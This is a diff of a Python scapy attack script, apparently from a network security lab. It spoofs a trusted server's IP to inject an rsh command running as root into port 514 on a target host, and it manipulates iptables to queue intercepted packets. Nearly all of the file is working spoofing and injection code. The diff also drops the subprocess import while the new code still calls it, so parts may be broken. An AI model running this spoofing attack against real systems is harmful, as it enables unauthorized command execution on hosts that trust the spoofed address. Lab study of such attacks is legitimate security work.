@@ -1,6 +1,6 @@
 from scapy.all import *
+from netfilterqueue import NetfilterQueue
 from time import sleep
-import subprocess
 
 # Configurações de rede
 attacker_ip = "10.9.0.1"
@@ -12,9 +12,10 @@ src_port = 1023
 dst_port = 514
 
 
-def bloqueia_RST():
-    comando = f"iptables -A OUTPUT -p tcp --tcp-flags RST RST --sport {src_port} -j DROP"
-    subprocess.run(comando, shell=True, text=True)
+def obter_interface():
+    comando = f"arp | grep {xterminal_ip} | awk '{{print $5}}'"
+    processo = subprocess.run(comando, shell=True, capture_output=True, text=True)
+    return processo.stdout.strip()
 
 def envia_SYN(seq):
     ip = IP()
@@ -47,7 +48,6 @@ def envia_ACK(seq, ack):
 
     send(pacote)
 
-
 def envia_RSH(seq, ack):
     ip = IP()
     ip.src = trusted_server_ip
@@ -60,18 +60,36 @@ def envia_RSH(seq, ack):
     tcp.dport = dst_port
     tcp.flags = "PA"
 
-    rsh_command = b"\x00root\x00root\x00ls\x00"
+    rsh_command = b"\x00root\x00root\x00cat teste.txt\x00"
 
     pacote = ip / tcp / rsh_command
 
-    send(pacote)
+    return sr1(pacote)
 
-bloqueia_RST()
+# Função de callback para processar os pacotes na fila
+def processa_pacote(pacote):
+    pacote_capturado = IP(pacote.get_payload())
+    
+    if pacote_capturado.haslayer(TCP) and pacote_capturado[TCP].dport == 514:
+        # Processar pacotes destinados à porta 514
+        print("Pacote capturado e processado:")
+        print(pacote_capturado.show())
+        
+    # Aceitar o pacote (ou você pode escolher 'drop' ou 'modify')
+    else:
+        pacote.accept()
+
+
+
+interface = obter_interface()
+os.system(f'iptables -I FORWARD -i {interface} -p tcp --dport 514 -j NFQUEUE --queue-num 1')
+
+nfqueue = NetfilterQueue()
+nfqueue.bind(1, processa_pacote)
 
 seq = 123
 
 resposta = envia_SYN(seq)
-resposta.show()
 
 sleep(0.5)
 
@@ -80,4 +98,5 @@ seq = seq + 1
 envia_ACK(seq, ack)
 
 resposta = envia_RSH(seq, ack)
-# resposta.show()
+
+os.system(f'iptables -D FORWARD -i {interface} -p tcp --dport 514 -j NFQUEUE --queue-num 1')
